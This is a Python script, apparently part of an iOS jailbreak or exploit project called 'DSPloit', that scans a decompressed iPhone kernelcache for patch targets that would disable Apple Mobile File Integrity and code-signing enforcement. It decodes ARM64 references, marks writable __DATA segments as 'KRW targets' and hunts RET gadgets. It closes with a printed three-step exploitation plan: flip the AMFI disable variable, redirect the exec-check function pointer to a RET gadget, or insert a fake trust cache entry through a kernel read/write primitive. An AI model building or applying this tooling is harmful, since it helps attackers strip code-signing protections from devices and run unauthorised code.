#!/usr/bin/env python3
"""
DSPloit AMFI Bypass Finder v5
==============================
Focused on finding PATCHABLE variables/pointers that disable AMFI.

Key targets:
1. amfi_get_out_of_my_way global variable
2. pmap_cs_allow_invalid global variable  
3. cs_enforcement_disable variable
4. Trust cache linked list pointer
5. MAC policy ops table (function pointers)

These are all in __DATA (writable) — patchable via socket KRW!
"""

import struct
import sys
import os

KCACHE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                      "kernelcache.release.iphone11b.decompressed")
if len(sys.argv) > 1:
    KCACHE = sys.argv[1]

def read32(data, off):
    if off + 4 > len(data): return 0
    return struct.unpack_from('<I', data, off)[0]

def read64(data, off):
    if off + 8 > len(data): return 0
    return struct.unpack_from('<Q', data, off)[0]

def find_all(data, pattern):
    results = []
    pos = 0
    while True:
        pos = data.find(pattern, pos)
        if pos == -1: break
        results.append(pos)
        pos += 1
    return results

def decode_adrp_add(data, offset):
    """Decode ADRP+ADD pair to get target address"""
    op1 = read32(data, offset)
    op2 = read32(data, offset + 4)
    
    if (op1 & 0x9F000000) != 0x90000000:  # not ADRP
        return None
    if (op2 & 0xFF800000) != 0x91000000:  # not ADD
        return None
    
    # ADRP
    immhi = (op1 >> 5) & 0x7FFFF
    immlo = (op1 >> 29) & 3
    imm = (immhi << 2) | immlo
    if imm & 0x100000: imm = imm - 0x200000
    pc_page = offset & ~0xFFF
    adrp_result = pc_page + (imm << 12)
    
    # ADD
    add_imm = (op2 >> 10) & 0xFFF
    sh = (op2 >> 22) & 1
    if sh: add_imm <<= 12
    
    return adrp_result + add_imm

def main():
    print("=" * 80)
    print("  DSPloit AMFI Bypass Finder v5")
    print("  Finding patchable AMFI disable variables in kernelcache")
    print("=" * 80)
    
    with open(KCACHE, 'rb') as f:
        data = f.read()
    
    print(f"\nLoaded: {len(data)/1024/1024:.1f} MB")
    
    # ================================================================
    print("\n" + "=" * 80)
    print("  TARGET 1: amfi_get_out_of_my_way")
    print("  Boot-arg that disables AMFI — stored as global variable")
    print("=" * 80)
    
    # Find the string
    amfi_goomy_str = find_all(data, b'amfi_get_out_of_my_way')
    print(f"\n  String locations: {len(amfi_goomy_str)}")
    for off in amfi_goomy_str:
        ctx = data[off:off+50].split(b'\x00')[0].decode('ascii', errors='replace')
        print(f"    0x{off:08x}: '{ctx}'")
    
    # Find code that references this string (ADRP+ADD pattern)
    # The code that reads this boot-arg stores result in a global variable
    # Pattern: PE_parse_boot_argn("amfi_get_out_of_my_way", &var, sizeof(var))
    if amfi_goomy_str:
        str_off = amfi_goomy_str[0]
        str_page = str_off & ~0xFFF
        str_page_off = str_off & 0xFFF
        
        print(f"\n  Searching for ADRP references to string page 0x{str_page:x}...")
        print(f"  String page offset: 0x{str_page_off:x}")
        
        # Scan code for ADRP that targets this page
        refs_found = 0
        for i in range(0, min(len(data), 30*1024*1024), 4):
            target = decode_adrp_add(data, i)
            if target is not None and target == str_off:
                refs_found += 1
                print(f"\n  ✅ Reference at file offset 0x{i:08x}")
                # Disassemble surrounding code to find the global variable
                print(f"     Context (20 instructions):")
                for j in range(-8, 80, 4):
                    op = read32(data, i + j)
                    addr = i + j
                    # Simple decode for key instructions
                    if (op & 0x9F000000) == 0x90000000:  # ADRP
                        t = decode_adrp_add(data, addr)
                        print(f"       0x{addr:08x}: ADRP+... → target 0x{t:08x}" if t else f"       0x{addr:08x}: ADRP")
                    elif (op & 0xFFC00000) == 0xF9000000:  # STR
                        rt = op & 0x1F; rn = (op>>5)&0x1F; imm = ((op>>10)&0xFFF)*8
                        print(f"       0x{addr:08x}: STR X{rt}, [X{rn}, #{imm}]")
                    elif (op & 0xFFC00000) == 0xB9000000:  # STR W
                        rt = op & 0x1F; rn = (op>>5)&0x1F; imm = ((op>>10)&0xFFF)*4
                        print(f"       0x{addr:08x}: STR W{rt}, [X{rn}, #{imm}]")
                    elif (op & 0xFFC00000) == 0xF9400000:  # LDR
                        rt = op & 0x1F; rn = (op>>5)&0x1F; imm = ((op>>10)&0xFFF)*8
                        print(f"       0x{addr:08x}: LDR X{rt}, [X{rn}, #{imm}]")
                    elif (op & 0xFC000000) == 0x94000000:  # BL
                        imm26 = op & 0x3FFFFFF
                        if imm26 & 0x2000000: imm26 = imm26 - 0x4000000
                        target_addr = addr + imm26 * 4
                        print(f"       0x{addr:08x}: BL 0x{target_addr:08x}")
                    elif op == 0xD65F03C0:
                        print(f"       0x{addr:08x}: RET")
                    else:
                        print(f"       0x{addr:08x}: (0x{op:08x})")
                
                if refs_found >= 3: break
    
    # ================================================================
    print("\n" + "=" * 80)
    print("  TARGET 2: pmap_cs_allow_invalid")
    print("  Variable that allows invalid code signatures")
    print("=" * 80)
    
    pmap_cs_strs = find_all(data, b'pmap_cs_allow_invalid')
    print(f"\n  String locations: {len(pmap_cs_strs)}")
    for off in pmap_cs_strs:
        ctx = data[off:off+60].split(b'\x00')[0].decode('ascii', errors='replace')
        print(f"    0x{off:08x}: '{ctx}'")
    
    # ================================================================
    print("\n" + "=" * 80)
    print("  TARGET 3: cs_enforcement_disable")
    print("  Global that disables code signing enforcement")
    print("=" * 80)
    
    cs_disable_strs = find_all(data, b'cs_enforcement_disable')
    print(f"\n  String locations: {len(cs_disable_strs)}")
    for off in cs_disable_strs:
        ctx = data[off:off+60].split(b'\x00')[0].decode('ascii', errors='replace')
        print(f"    0x{off:08x}: '{ctx}'")
    
    # Also search for related
    for pattern in [b'cs_enforcement', b'cs_disabled', b'cs_debug', 
                    b'cs_allow_invalid', b'proc_enforce']:
        hits = find_all(data, pattern)
        if hits:
            print(f"  '{pattern.decode()}': {len(hits)} hits")
            for off in hits[:3]:
                ctx = data[off:off+50].split(b'\x00')[0].decode('ascii', errors='replace')
                print(f"    0x{off:08x}: '{ctx}'")
    
    # ================================================================
    print("\n" + "=" * 80)
    print("  TARGET 4: Trust Cache Linked List")
    print("  If we can find and modify the trust cache list...")
    print("=" * 80)
    
    tc_strs = find_all(data, b'trust_cache_init')
    print(f"\n  trust_cache_init: {len(tc_strs)} hits")
    for off in tc_strs[:3]:
        ctx = data[off:off+40].split(b'\x00')[0].decode('ascii', errors='replace')
        print(f"    0x{off:08x}: '{ctx}'")
        
        # Find references to this
        refs = 0
        for i in range(0, min(len(data), 20*1024*1024), 4):
            t = decode_adrp_add(data, i)
            if t == off:
                refs += 1
                print(f"    → Referenced at 0x{i:08x}")
                if refs >= 2: break
    
    # ================================================================
    print("\n" + "=" * 80)
    print("  TARGET 5: AMFI Kext Global Variables")
    print("  Find variables near AMFI strings that control behavior")
    print("=" * 80)
    
    # AMFI kext has globals like:
    # - amfi_allow_any_signature
    # - amfi_unrestrict_task_for_pid  
    # - amfi_allow_invalid_signatures
    
    amfi_vars = [
        b'amfi_allow_any_signature',
        b'amfi_unrestrict',
        b'amfi_allow_invalid',
        b'amfi_developer_mode',
        b'amfi_launch_constraint',
    ]
    
    for pattern in amfi_vars:
        hits = find_all(data, pattern)
        if hits:
            print(f"\n  '{pattern.decode()}': {len(hits)} hits")
            for off in hits[:3]:
                ctx = data[off:off+60].split(b'\x00')[0].decode('ascii', errors='replace')
                print(f"    0x{off:08x}: '{ctx}'")
    
    # ================================================================
    print("\n" + "=" * 80)
    print("  TARGET 6: Mach-O Segment Layout")
    print("  Find __DATA segment boundaries for KRW targeting")
    print("=" * 80)
    
    # Parse Mach-O header to find segments
    magic = read32(data, 0)
    if magic == 0xFEEDFACF:
        ncmds = read32(data, 16)
        sizeofcmds = read32(data, 20)
        print(f"\n  Mach-O 64-bit, {ncmds} load commands")
        
        offset = 32  # after mach_header_64
        for i in range(ncmds):
            if offset >= len(data): break
            cmd = read32(data, offset)
            cmdsize = read32(data, offset + 4)
            
            if cmd == 0x19:  # LC_SEGMENT_64
                segname = data[offset+8:offset+24].split(b'\x00')[0].decode()
                vmaddr = read64(data, offset + 24)
                vmsize = read64(data, offset + 32)
                fileoff = read64(data, offset + 40)
                filesize = read64(data, offset + 48)
                maxprot = read32(data, offset + 56)
                initprot = read32(data, offset + 60)
                
                prot_str = ""
                if initprot & 1: prot_str += "R"
                if initprot & 2: prot_str += "W"
                if initprot & 4: prot_str += "X"
                
                writable = "← WRITABLE (KRW target!)" if (initprot & 2) else ""
                print(f"    {segname:20s} vm=0x{vmaddr:016x} size=0x{vmsize:08x} "
                      f"file=0x{fileoff:08x} prot={prot_str} {writable}")
            
            offset += cmdsize
    
    # ================================================================
    print("\n" + "=" * 80)
    print("  TARGET 7: Find RET gadget address")
    print("  Need address of a simple RET instruction for function pointer patch")
    print("=" * 80)
    
    # Find first RET instruction in __TEXT
    ret_opcode = struct.pack('<I', 0xD65F03C0)
    first_ret = data.find(ret_opcode)
    if first_ret != -1:
        print(f"\n  First RET at file offset: 0x{first_ret:08x}")
        # Find a few more
        rets = find_all(data[:5*1024*1024], ret_opcode)
        print(f"  Total RETs in first 5MB: {len(rets)}")
        print(f"  First 5 RET locations:")
        for off in rets[:5]:
            print(f"    0x{off:08x}")
    
    # ================================================================
    print("\n" + "=" * 80)
    print("  EXPLOITATION PLAN")
    print("=" * 80)
    
    print("""
╔══════════════════════════════════════════════════════════════════════════╗
║  AMFI BYPASS EXPLOITATION PLAN                                          ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  APPROACH A: Patch amfi_get_out_of_my_way variable                       ║
║  ─────────────────────────────────────────────────                       ║
║  1. Find the global variable address from ADRP+ADD+STR pattern          ║
║  2. Calculate kernel VA = file_offset - __DATA_fileoff + __DATA_vmaddr   ║
║  3. Write 1 to that address via socket KRW                              ║
║  4. AMFI disabled! All binaries can execute!                             ║
║                                                                          ║
║  RISK: Variable might be in __DATA_CONST (PPL protected)                 ║
║  TEST: Try writing — if PPL blocks, value won't change                   ║
║                                                                          ║
║  APPROACH B: Patch MAC policy ops function pointer                       ║
║  ─────────────────────────────────────────────────                       ║
║  1. Find AMFI's mac_policy_ops table in __DATA                           ║
║  2. Find mpo_vnode_check_exec entry (function pointer)                   ║
║  3. Replace with address of RET instruction                              ║
║  4. All exec checks return 0 (success) → any binary runs!               ║
║                                                                          ║
║  RISK: Ops table might be in __DATA_CONST or PAC-signed                  ║
║                                                                          ║
║  APPROACH C: Patch trust cache list                                      ║
║  ─────────────────────────────────────────────────                       ║
║  1. Find loadable_trust_caches head pointer                              ║
║  2. Allocate fake trust cache entry in kernel heap                       ║
║  3. Add our CDHash to fake entry                                         ║
║  4. Link fake entry into list                                            ║
║  5. Our binary passes trust cache check!                                 ║
║                                                                          ║
║  RISK: Trust cache might be in PPL-protected zone                        ║
║                                                                          ║
║  PRIORITY: A > B > C (A is simplest if variable is writable)             ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
""")

if __name__ == "__main__":
    main()
